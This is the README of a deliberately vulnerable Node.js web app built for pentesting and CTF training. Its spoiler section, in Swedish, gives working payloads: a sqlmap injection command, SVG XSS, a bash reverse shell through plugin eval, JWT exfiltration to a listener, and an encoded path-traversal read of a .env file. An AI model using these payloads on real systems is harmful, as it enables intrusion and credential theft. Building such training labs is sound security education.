# GameVerse 2

GameVerse2 is a deliberately vulnerable web application built with Node.js and SQLite.  
It’s designed for pentesting labs, security education, and CTF-style training.

> ⚠️ **For educational and testing use only!**  
> Do not deploy this server to a production or public environment.

---

## Features

- User authentication with JWT
- SQLite database (file-based)
- File upload and plugin execution system
- Avatar system with SVG support
- Deliberately insecure code for hands-on security training

---

## Getting Started

### 1. Clone the repository

```bash
git clone https://github.com/your-org/gameverse2.git
cd gameverse2
```

---

### 2. Start with Node.js

> Make sure you have Node.js 18+ and npm installed.

#### Install dependencies:

```bash
npm install
```

#### Start the server:

```bash
node server.js
```

Server will run on [http://localhost:3333](http://localhost:3333)

---

### 3. Start with Docker

> Recommended for clean lab environments and to easily persist the database.

#### Build the image:

```bash
docker build -t gameverse2 .
```

#### Start the container (with database persistence):

```bash
docker run -p 3333:3333 -v $(pwd)/gameverse.db:/home/appuser/app/gameverse.db gameverse2
```

---

## Ports

- Default HTTP port: **3333**

---

<details>
  <summary>🕵️ <strong>Sårbarheter (spoilers!)</strong></summary>

### SQLi i `/users`
Exempel med sqlmap:
```bash
sqlmap -u "10.3.10.182:3333/users/?q=*" --headers="Authorization: Bearer <JWT>" --code 200 --tables --tamper=space2comment --risk 3 --level 5
```

---

### XSS via avatar-URL (med `<object>`)
Skapa SVG:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```
Bädda in SVG så här:
```html
<object data="uppladdad.svg" type="image/svg+xml"></object>
```

---

### Eval-baserad plugin-RCE för admins
```js
require('child_process').exec('bash -c "bash -i >& /dev/tcp/localhost/4444 0>&1"');
```

---

### Path traversal mot plugins
```plaintext
Ladda upp .js utanför plugins med ../ i path – se LFI-exemplet nedan.
```

---

### JWT-exfiltration via XSS
```xml
<svg>
  <animate onend="new Image().src='//localhost:4444/jwt?d='+encodeURIComponent(localStorage.getItem('jwtToken'))" dur="1s" attributeName="x"/>
</svg>
```

---

### Klartextlösenord i databasen
```bash
sqlite3 gameverse.db
-- visa alla användare och lösenord i klartext!
```

---

### LFI i `/images`
```plaintext
/images?path=%252e%252e%252fconfig%252fdev%252f.env
```
(Dubbel URL-encode – `../config/dev/.env`)
</details>